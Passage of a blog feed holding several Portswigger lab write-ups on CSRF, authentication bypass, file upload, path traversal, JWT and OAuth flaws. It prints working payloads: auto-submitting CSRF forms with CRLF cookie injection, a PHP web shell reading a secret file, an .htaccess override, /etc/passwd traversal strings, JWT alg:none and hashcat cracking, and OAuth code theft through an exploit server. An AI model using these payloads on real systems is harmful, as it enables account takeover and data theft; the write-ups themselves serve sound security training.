alt="image-20231226151506038"></p><p>成功。</p><p>最终的利用思路就是，将自己的csrfkey和csrf同时替换到受害者处，csrfkey通过注入，而csrf通过poc实现。</p><p>注入的代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a49002f035387ea802130a40049000a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=lklECpJ0o4k9v2iM63JurrAsOE5DpSZ6%3b%20SameSite=None&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit()&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结合poc，利用成功：</p><p><img src="/2023/04/27/file-upload/0231226151721422.png" alt="image-20231226151721422"></p><h2 id="在cookie中重复的csrf-token"><a href="#在cookie中重复的csrf-token" class="headerlink" title="在cookie中重复的csrf-token"></a>在cookie中重复的csrf-token</h2><p>这里在cookie和body中同时存在csrf参数，如果单独修改任一csrf都会报错，尝试后发现，如果将两处同时修改，则能正常请求。</p><p><img src="/2023/04/27/file-upload/0231226152248671.png" alt="image-20231226152248671"></p><p>下面的步骤和前面类似，通过search先将cookie中的csrf注入到受害者浏览器，再通过poc给出一个相同的csrf即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0aac002b03978751804f446900b400e8.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1213213<span class="hljs-symbol">&amp;#64;</span>11&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0aac002b03978751804f446900b400e8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="删除referer绕过验证"><a href="#删除referer绕过验证" class="headerlink" title="删除referer绕过验证"></a>删除referer绕过验证</h2><p>这里不存在csrf token，但是referer会有限制，如果referer更改，会导致无法成功请求：</p><p><img src="/2023/04/27/file-upload/0231226155103413.png" alt="image-20231226155103413"></p><p>也就是说，当利用前面的poc执行攻击时，会因为referer不一致从而失败。</p><p>尝试删除referer：</p><p><img src="/2023/04/27/file-upload/0231226155157656.png" alt="image-20231226155157656"></p><p>成功。</p><p>修改poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a1f000c0396e0bd857f3055006f0062.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11223<span class="hljs-symbol">&amp;#64;</span>11&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);</span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>deliver即可。</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — Portswigger Labs — Authentication</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AAuthentication/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AAuthentication/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-Portswigger-Labs-—-Authentication"><a href="#Portswigger-Labs-—-Portswigger-Labs-—-Authentication" class="headerlink" title="Portswigger Labs — Portswigger Labs — Authentication"></a>Portswigger Labs — Portswigger Labs — Authentication</h1><h2 id="通过不同响应枚举用户名"><a href="#通过不同响应枚举用户名" class="headerlink" title="通过不同响应枚举用户名"></a>通过不同响应枚举用户名</h2><p>输入test&#x2F;test，登录失败：</p><p><img src="/2023/04/27/file-upload/0231204091622699.png" alt="image-20231204091622699"></p><p>通过lab给出的用户名密码字典爆破：</p><p><img src="/2023/04/27/file-upload/0231204091921048.png" alt="image-20231204091921048"></p><p>用户名为puppet，同样的方法爆破密码：</p><p><img src="/2023/04/27/file-upload/0231204092136351.png" alt="image-20231204092136351"></p><p>成功登录：</p><p><img src="/2023/04/27/file-upload/0231204092201900.png" alt="image-20231204092201900"></p><h2 id="简单的双因素认证绕过"><a href="#简单的双因素认证绕过" class="headerlink" title="简单的双因素认证绕过"></a>简单的双因素认证绕过</h2><p>该lab中拥有wiener和carlos两个账户的用户名和密码，但是只能接收winner账户的邮件，需要绕过双因素认证登录到carlos。</p><p>使用wiener账户登录，输入正确的邮箱验证码后，跳转：</p><p><img src="/2023/04/27/file-upload/0231204093449727.png" alt="image-20231204093449727"></p><p>url为&#x2F;my-account?id&#x3D;wiener。</p><p>切换到carlos账户，输入账号密码：</p><p><img src="/2023/04/27/file-upload/0231204093556582.png" alt="image-20231204093556582"></p><p>手动访问url：&#x2F;my-account?id&#x3D;carlos:</p><p><img src="/2023/04/27/file-upload/0231204093632578.png" alt="image-20231204093632578"></p><p>成功跳转，绕过双因素认证。</p><h2 id="重置密码逻辑错误"><a href="#重置密码逻辑错误" class="headerlink" title="重置密码逻辑错误"></a>重置密码逻辑错误</h2><p>拥有wiener&#x2F;peter账户，需要通过重置密码登录到carlos账户。</p><p>点击reset password，抓包查看：</p><p><img src="/2023/04/27/file-upload/0231204094636251.png" alt="image-20231204094636251"></p><p>这里没有验证旧密码，只有username参数和temp-forgot-password-token参数，将username改为carlos：</p><p><img src="/2023/04/27/file-upload/0231204094724525.png" alt="image-20231204094724525"></p><p>成功登录，如果登录失败可以尝试删除token值。</p><h2 id="通过响应包的差别枚举用户名"><a href="#通过响应包的差别枚举用户名" class="headerlink" title="通过响应包的差别枚举用户名"></a>通过响应包的差别枚举用户名</h2><p>首先还是登录，抓包，放到intruder模块，爆破用户名：</p><p><img src="/2023/04/27/file-upload/0231204095753525.png" alt="image-20231204095753525"></p><p>返回包的长度有多种返回值，响应状态码都是200，无法区分。</p><p>点击setting：</p><p><img src="/2023/04/27/file-upload/0231204095931465.png" alt="image-20231204095931465"></p><p>再点击attack-repeat，重新爆破：</p><p><img src="/2023/04/27/file-upload/0231204100024986.png" alt="image-20231204100024986"></p><p>此时会多出一列，就是对刚刚选中的内容进行正则匹配的值，对该列排序发现只有一个payload与众不同：auth。</p><p>用户名改为auth，爆破密码：</p><p><img src="/2023/04/27/file-upload/0231204100215418.png" alt="image-20231204100215418"></p><p>出现一个302返回包，成功登录：</p><p><img src="/2023/04/27/file-upload/0231204100251154.png" alt="image-20231204100251154"></p><h2 id="通过响应包时间枚举用户名"><a href="#通过响应包时间枚举用户名" class="headerlink" title="通过响应包时间枚举用户名"></a>通过响应包时间枚举用户名</h2><p>同样先爆破：</p><p><img src="/2023/04/27/file-upload/0231204101218614.png" alt="image-20231204101218614"></p><p>做了次数限制，需要等待30min。</p><p>尝试使用XFF头绕过，结合burp的pitch fork爆破模式：</p><p><img src="/2023/04/27/file-upload/0231204104636055.png" alt="image-20231204104636055"></p><p>XFF设置为数字：</p><p><img src="/2023/04/27/file-upload/0231204104658964.png" alt="image-20231204104658964"></p><p>username设置为字典：</p><p><img src="/2023/04/27/file-upload/0231204104712074.png" alt="image-20231204104712074"></p><p>爆破之后，在columns中添加response received来查看响应时间，发现当用户名为ai时，响应时间明显变长：</p><p><img src="/2023/04/27/file-upload/0231204104804727.png" alt="image-20231204104804727"></p><p>接下来爆破密码，选择XFF和password，注意更改xff的payload避免与爆破用户名时重复：</p><p><img src="/2023/04/27/file-upload/0231204105216443.png" alt="image-20231204105216443"></p><p>302即为正确的密码：</p><p><img src="/2023/04/27/file-upload/0231204105228971.png" alt="image-20231204105228971"></p><p>成功登录：</p><p><img src="/2023/04/27/file-upload/0231204105556468.png" alt="image-20231204105556468"></p><h2 id="失效的ip-block爆破保护"><a href="#失效的ip-block爆破保护" class="headerlink" title="失效的ip-block爆破保护"></a>失效的ip-block爆破保护</h2><p>如果尝试失败3次以上，就会锁住：</p><p><img src="/2023/04/27/file-upload/0231204111323292.png" alt="image-20231204111323292"></p><p>但是如果登录成功，次数就会重置。</p><p>因此构造如下用户名字典：</p><p><img src="/2023/04/27/file-upload/0231204111419254.png" alt="image-20231204111419254"></p><p>密码字典如下：</p><p><img src="/2023/04/27/file-upload/0231204111403892.png" alt="image-20231204111403892"></p><p>这样每次失败次数都会被重置为1.</p><p>密码字典可以用如下脚本生成：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;passwords.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.readlines()<br><br><span class="hljs-comment"># 将密码和&quot;peter&quot;交替写入到新的密码字典文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new_passwords.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>        f.<span class="hljs-built_in">write</span>(<span class="hljs-string">&#x27;peter\n&#x27;</span>)<br>        f.<span class="hljs-built_in">write</span>(password.strip() + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>设置线程为1，保证按照设置的字典顺序执行爆破：</p><p><img src="/2023/04/27/file-upload/0231204111517502.png" alt="image-20231204111517502"></p><p>302，成功：</p><p><img src="/2023/04/27/file-upload/0231204111647318.png" alt="image-20231204111647318"></p><p>成功登录：</p><p><img src="/2023/04/27/file-upload/0231204111708580.png" alt="image-20231204111708580"></p><h2 id="双因素认证中的逻辑错误"><a href="#双因素认证中的逻辑错误" class="headerlink" title="双因素认证中的逻辑错误"></a>双因素认证中的逻辑错误</h2><p>使用winner走一遍正常流程，在回去邮箱验证码时，存在如下请求包：</p><p><img src="/2023/04/27/file-upload/0231204130719536.png" alt="image-20231204130719536"></p><p>在输入邮箱验证码时，报文如下：</p><p><img src="/2023/04/27/file-upload/0231204130747624.png" alt="image-20231204130747624"></p><p>可以判断出，GET &#x2F;login2是发送验证码，而POST &#x2F;login2是进行验证。</p><p>将GET请求发送到repeater，将verify改为carlos，发送一个验证码，再将POST请求中的verify参数改为carlos，并对mfa-code进行爆破：</p><p><img src="/2023/04/27/file-upload/0231204130909761.png" alt="image-20231204130909761"></p><p>成功。</p><p>最后发送到repeater，选择request in browser即可成功以carlos账户登录，绕过验证。</p><p><img src="/2023/04/27/file-upload/0231204130943386.png" alt="image-20231204130943386"></p><h2 id="爆破stay-logged-in-cookie"><a href="#爆破stay-logged-in-cookie" class="headerlink" title="爆破stay-logged-in cookie"></a>爆破stay-logged-in cookie</h2><p>使用wiener&#x2F;peter登录，勾选stay login：</p><p><img src="/2023/04/27/file-upload/0231204133722361.png" alt="image-20231204133722361"></p><p>存在一个stay-logged-in cookie，base64decode查看：</p><p><img src="/2023/04/27/file-upload/0231204133743540.png" alt="image-20231204133743540"></p><p>再解MD5：</p><p><img src="/2023/04/27/file-upload/0231204133802138.png" alt="image-20231204133802138"></p><p>也就是base64encode{username:MD5[password]}的格式。</p><p>发送到intruder模块，添加payload processing:</p><p><img src="/2023/04/27/file-upload/0231204134001212.png" alt="image-20231204134001212"></p><p>注意顺序是先md5，再加前缀，最后base64encode。</p><p>删除cookie中的多余字段，爆破：</p><p><img src="/2023/04/27/file-upload/0231204134046673.png" alt="image-20231204134046673"></p><p>成功：</p><p><img src="/2023/04/27/file-upload/0231204134100473.png" alt="image-20231204134100473"></p><h2 id="通过中间件重置密码"><a href="#通过中间件重置密码" class="headerlink" title="通过中间件重置密码"></a>通过中间件重置密码</h2><p>在重置密码处，输入wienie，抓包：</p><p><img src="/2023/04/27/file-upload/0231204145754947.png" alt="image-20231204145754947"></p><p>添加一个请求头X-Forwarded-Host，值为exploit server地址，同时将username改为carlos，repeat之后重置邮箱会被发送到攻击者的exploit server，查看log：</p><p><img src="/2023/04/27/file-upload/0231204145855937.png" alt="image-20231204145855937"></p><p>将url拼接，重置密码：</p><p><img src="/2023/04/27/file-upload/0231204145425131.png" alt="image-20231204145425131"></p><p>成功登录：</p><p><img src="/2023/04/27/file-upload/0231204145440642.png" alt="image-20231204145440642"></p><h2 id="通过密码重置爆破密码"><a href="#通过密码重置爆破密码" class="headerlink" title="通过密码重置爆破密码"></a>通过密码重置爆破密码</h2><p>在该lab中，重置密码时，如果当前密码输入正确，new passwd1和new passwd2一致，账户将被锁定，如果passwd不一致，则会报错Current password is incorrect，当密码正确时，则提示New passwords do not match，利用不同的响应，可以进行密码爆破。</p><p><img src="/2023/04/27/file-upload/0231204151427352.png" alt="image-20231204151427352"></p><p>amanda。改为123456：</p><p><img src="/2023/04/27/file-upload/0231204151529075.png" alt="image-20231204151529075"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — File Upload</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AFile%20Upload/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AFile%20Upload/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-File-Upload"><a href="#Portswigger-Labs-—-File-Upload" class="headerlink" title="Portswigger Labs — File Upload"></a>Portswigger Labs — File Upload</h1><p>Today, we are delving into the the exploitation techniques associated with file upload vulnerabilities.</p><p><img src="/2023/04/27/file-upload/0231130105339823.png" alt="image-20231130105339823"></p><h4 id="Web-shell-upload-via-Content-Type-restriction-bypass"><a href="#Web-shell-upload-via-Content-Type-restriction-bypass" class="headerlink" title="Web shell upload via Content-Type restriction bypass"></a>Web shell upload via Content-Type restriction bypass</h4><blockquote><p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</p></blockquote><p>Initiate the login process first. Following successful login, attempt to upload shell.php with the content of <code>&lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&gt;</code> , only to encounter interception measures.</p><p><img src="/2023/04/27/file-upload/0231130110700109.png" alt="image-20231130110700109"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sorry, file <span class="hljs-built_in">type</span> application/octet-stream is not allowed. Only image/jpeg and image/png are allowed.<br></code></pre></td></tr></table></figure><p>That’ OK. Let’s switch value of the Content-Type to image&#x2F;jpeg and try again.</p><p><img src="/2023/04/27/file-upload/0231130110933972.png" alt="image-20231130110933972"></p><p>Access the file and obtain the secret:</p><p><img src="/2023/04/27/file-upload/0231130111122700.png" alt="image-20231130111122700"></p><h4 id="Web-shell-upload-via-path-traversal"><a href="#Web-shell-upload-via-path-traversal" class="headerlink" title="Web shell upload via path traversal"></a>Web shell upload via path traversal</h4><blockquote><p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>*/home/carlos/secret*</code>. Submit this secret using the button provided in the lab banner.</p></blockquote><p>Although our upload request was not intercepted, accessing the file revealed that the php file was not parsed.</p><p><img src="/2023/04/27/file-upload/0231130111944686.png" alt="image-20231130111944686"></p><p>It directly returned the content of the PHP code like following:</p><p><img src="/2023/04/27/file-upload/0231130111959234.png" alt="image-20231130111959234"></p><p>Attempting ..&#x2F;shell.php, it returned the same response as earlier:</p><p><img src="/2023/04/27/file-upload/0231130112541732.png" alt="image-20231130112541732"></p><p>Evidently, it didn’t work.</p><p>Make a slight alteration, try URL encoding “..&#x2F;” and observe:</p><p><img src="/2023/04/27/file-upload/0231130113230974.png" alt="image-20231130113230974"></p><p>The file avatars&#x2F;..&#x2F;shell.php has been uploaded. It reminds me that php file has been uploaded to another directory.</p><p><img src="/2023/04/27/file-upload/0231130113336645.png" alt="image-20231130113336645"></p><p>Make it.</p><h4 id="Web-shell-upload-via-extension-blacklist-bypass"><a href="#Web-shell-upload-via-extension-blacklist-bypass" class="headerlink" title="Web shell upload via extension blacklist bypass"></a>Web shell upload via extension blacklist bypass</h4><blockquote><p>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</p></blockquote><p>In this segment, we need to break the blacklist restriction.</p><p>First off, uploading  the php file directly, only to get a 403 code and a remind of “Sorry, php files are not allowed”.</p><p><img src="/2023/04/27/file-upload/0231130114018619.png" alt="image-20231130114018619"></p><p>Server header in response captured my attention. Could the blacklist possibly overlooked .htaccess?</p><p>I am attempting to upload the .htaccess file to manipulate the server into parsing other file formats as PHP, thereby gaining access to the secret information.</p><p><img src="/2023/04/27/file-upload/0231130114828180.png" alt="image-20231130114828180"></p><p>It seems that we have successfully completed the first step.</p><p>Let’s say something more about the file content:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>The term “shell” in this context appears to be a regular expression, indicating that this configuration block applies only to files with name containing “shell”.</p><p>The “setHandler” directive instructs the server to use the PHP interpreter to process matching files.</p><p>Therefore, by uploading a file named shell.jpg, we can exploit the blacklist filter while also having it parsed as PHP.</p><p><img src="/2023/04/27/file-upload/0231130131017036.png" alt="image-20231130131017036"></p><h4 id="Web-shell-upload-via-obfuscated-file-extension"><a href="#Web-shell-upload-via-obfuscated-file-extension" class="headerlink" title="Web shell upload via obfuscated file extension"></a>Web shell upload via obfuscated file extension</h4><blockquote><p>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</p></blockquote><p>Technique mentioned in this section is truly easily comprehensible.</p><p>In fact, it utilizes null byte injection. The server might overlook the content after %00, interpreting it as PHP. However, this method also successfully navigates through the suffix check.</p><p><img src="/2023/04/27/file-upload/0231130132023900.png" alt="image-20231130132023900"></p><p>Just switch shell.php to shell.php%00.jpg.</p><p>It worked XD!</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — Path Traversal, Information disclosure, JWT</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8APath%20Traversal,%20Information%20disclosure,%20JWT/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8APath%20Traversal,%20Information%20disclosure,%20JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-Path-Traversal-Information-disclosure-JWT"><a href="#Portswigger-Labs-—-Path-Traversal-Information-disclosure-JWT" class="headerlink" title="Portswigger Labs — Path Traversal, Information disclosure, JWT"></a>Portswigger Labs — Path Traversal, Information disclosure, JWT</h1><p>Over the upcoming period, I will update a series of articles related to Portswigger Labs, which will consist of my brief notes for future use.</p><p>Today, I will talk to you about <strong>Path Traversal</strong>, <strong>Information disclosure</strong> and <strong>JWT.</strong></p><p><img src="/2023/04/27/file-upload/0231115115048126.png" alt="image-20231115115048126"></p><p><strong>Path Traversal:</strong></p><ul><li>..&#x2F;..&#x2F;etc&#x2F;passwd — normal payload</li><li>&#x2F;etc&#x2F;passwd — absolute path</li><li>&#x2F;etc&#x2F;passwd%00.jpg — bypass extension validation</li><li>….&#x2F;&#x2F;….&#x2F;&#x2F;etc&#x2F;passwd — bypass strip ..&#x2F;</li><li>..%252fetc&#x2F;passwd — urlencode</li><li>&#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd — bypass validation of the start of the path</li></ul><p><strong>JWT</strong>:</p><ul><li>change the username to admin directly — bypass unverified signature</li><li>change the username &amp;&amp; set alg:none &amp;&amp; del signature : eyxxx.xxx. — bypass flawed signature verification</li><li>use hashcat to brute-force secret key: hashcat -a 0 -m 16500 <jwt> jwt.secrets.list — bypass weak signing key</li></ul><p><strong>Information disclosure:</strong></p><ul><li>error page</li><li>debug page</li><li>backup files</li><li>version control history(.git): wget -r <a href="https://xxx/.git/">https://xxx/.git/</a> &amp;&amp; git GUI</li></ul>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — OAuth authentication</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AOAuth%20authentication/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AOAuth%20authentication/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-OAuth-authentication"><a href="#Portswigger-Labs-—-OAuth-authentication" class="headerlink" title="Portswigger Labs — OAuth authentication"></a>Portswigger Labs — OAuth authentication</h1><p>同步自<a href="https://medium.com/@rynnnn617/portswigger-labs-oauth-authentication-f5863e57303f">Portswigger Labs — OAuth authentication | by Ry4nnnn | Nov, 2023 | Medium</a></p><p>I’m gonna talk to you about oauth authentication and how to exploit it in this article.</p><p><img src="/2023/04/27/file-upload/20231122135316994.png" alt="image-20231122135316994"></p><h2 id="Authentication-bypass-via-OAuth-implicit-flow"><a href="#Authentication-bypass-via-OAuth-implicit-flow" class="headerlink" title="Authentication bypass via OAuth implicit flow"></a>Authentication bypass via OAuth implicit flow</h2><blockquote><p>To solve the lab, log in to Carlos’s account. His email address is <code>carlos@carlos-montoya.net</code>.</p></blockquote><p>Logging in with winner&#x2F;peter, inspecting the history traffic in burp reveals a notable POST request with the path <code>/authenticate.</code></p><p><img src="/2023/04/27/file-upload/20231122180118224.png" alt="image-20231122180118224"></p><p>Let’s change email param to calos and right-click the request, choosing request in browser in original session:</p><p><img src="/2023/04/27/file-upload/20231122180136713.png" alt="image-20231122180136713"></p><p>Congratulations!</p><p><img src="/2023/04/27/file-upload/20231122180152388.png" alt="image-20231122180152388"></p><h2 id="Forced-OAuth-profile-linking"><a href="#Forced-OAuth-profile-linking" class="headerlink" title="Forced OAuth profile linking"></a>Forced OAuth profile linking</h2><blockquote><p>To solve the lab, use a <a href="https://portswigger.net/web-security/csrf">CSRF attack</a> to attach your own social media profile to the admin user’s account on the blog website, then access the admin panel and delete <code>carlos</code>.</p></blockquote><p>In this segment, we can login with traditianal username&#x2F;password. Finishing that, logging in with social media is available.</p><p>Let’s commence from the beginning:</p><p><img src="/2023/04/27/file-upload/20231122180205266.png" alt="image-20231122180205266"></p><p>Successfully login with winner&#x2F;peter.</p><p>Click on attach a social profile and you will be redirected to the following page:</p><p><img src="/2023/04/27/file-upload/20231122180223732.png" alt="image-20231122180223732"></p><p>Inspecting the traffic, we can identify a <code>/oauth-linking</code> request. This request is utilized for account binding, providing a crucial gateway for further access.</p><p><img src="/2023/04/27/file-upload/20231122180235187.png" alt="image-20231122180235187"></p><p>At this step, our goal is to manipulate the above packet.</p><p>Let’s click the attach a social profile one more time.</p><p>Turn on the intercept, forward and forward and forward, until come across <code>/oauth-linking</code>.</p><p>Right-click and select copy url, and then drop this packet, preventing it from binding to our own account.</p><p>Go to the exploit server and create an <code>iframe</code> in which the <code>src</code> attribute points to the URL we just copied.</p><p><img src="/2023/04/27/file-upload/20231122180247342.png" alt="image-20231122180247342"></p><p>Click on deliver exploit to victim and go back to the homepage, attaching a social profile, and the result should look something like this:</p><p><img src="/2023/04/27/file-upload/20231122180258448.png" alt="image-20231122180258448"></p><p>Now we successfully bound to the admin account.</p><p>Next section.</p><h2 id="OAuth-account-hijacking-via-redirect-uri"><a href="#OAuth-account-hijacking-via-redirect-uri" class="headerlink" title="OAuth account hijacking via redirect_uri"></a>OAuth account hijacking via redirect_uri</h2><blockquote><p>To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user <code>carlos</code>.</p></blockquote><p>The provided login credentials remain as wiener&#x2F;peter. Upon logging in with these credentials, click on LOG OUT. Subsequently, click on my account again, and you’ll observe a direct successful login.</p><p>Inspecting the traffic in burp, a GET request with the path <code>/auth?client_id=xxx&amp;redirect_uri=xxx</code> is evident.</p><p><img src="/2023/04/27/file-upload/20231122180356090.png" alt="image-20231122180356090"></p><p>Modifying the redirect_uri parameter to <code>exploit-server</code> results in a successful access log entry, confirming our fully control over this parameter.</p><p><img src="/2023/04/27/file-upload/20231122180407421.png" alt="image-20231122180407421"></p><p>Our strategy involves redirecting with the redirect_uri parameter modified to the exploit-server during redirection. This will prompt the admin user to access the link, allowing us to obtain the admin login credentials in the form of a code.</p><p><img src="/2023/04/27/file-upload/20231122180427807.png" alt="image-20231122180427807"></p><p>Check access log and secret code is presented.</p><p>Subsequently, we can utilize this code to log in to the admin account by modifying the parameter like this:</p><p><img src="/2023/04/27/file-upload/20231122180444953.png" alt="image-20231122180444953"></p><p>Admin privilege:</p><p><img src="/2023/04/27/file-upload/20231122180456716.png" 